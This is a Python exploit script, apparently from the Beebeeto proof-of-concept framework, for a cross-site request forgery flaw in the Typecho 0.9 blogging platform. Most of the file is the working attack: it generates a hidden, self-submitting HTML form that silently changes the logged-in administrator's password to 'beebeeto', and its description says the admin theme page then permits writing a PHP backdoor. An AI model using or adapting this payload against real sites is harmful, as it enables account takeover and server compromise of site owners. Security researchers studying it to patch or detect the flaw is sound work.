#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0102',
            'name': 'Typecho 0.9(13.12.12) CSRF修改管理员密码漏洞 Exploit',
            'author': '雷蜂',
            'create_date': '2014-10-22',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Typecho',
            'vul_version': ['0.9'],
            'type': 'Cross Site Request Forgery',
            'tag': ['Typecho漏洞', 'CSRF修改管理员密码漏洞', '/profile.php'],
            'desc': '''
                    http://typecho/admin/profile.php page, Change password form CSRF vul.
                    http://typecho/admin/themes.php, We can write the PHP Backdoor in this page.
                    ''',
            'references': ['http://www.hackersoul.com/typecho/ff0000-hsdb-0002.html',
            ],
        },
    }


    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target'] + '/index.php/action/users-profile'
        if args['options']['verbose']:
            print '[*] Generation: ' + verify_url
        temp = '''
        <div style="display: none;">
        <form action="%s" method="post" name="ff0000team" enctype="application/x-www-form-urlencoded">
        <input type="hidden" name="password" value="beebeeto"/>
        <input type="hidden" name="confirm" value="beebeeto" />
        <input name="do" type="hidden" value="password" />
        <button type="submit"></button>
        </form>
        </div>
        <script>
        setTimeout("document.ff0000team.submit()", 2000);
        </script>
        ''' % verify_url
        print '[*] Copy code: ' + temp
        print '[*] Specific use: ' + str(MyPoc.poc_info['vul']['references'])
        args['success'] = True
        args['poc_ret']['vul_url'] = 'Generation ok'
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())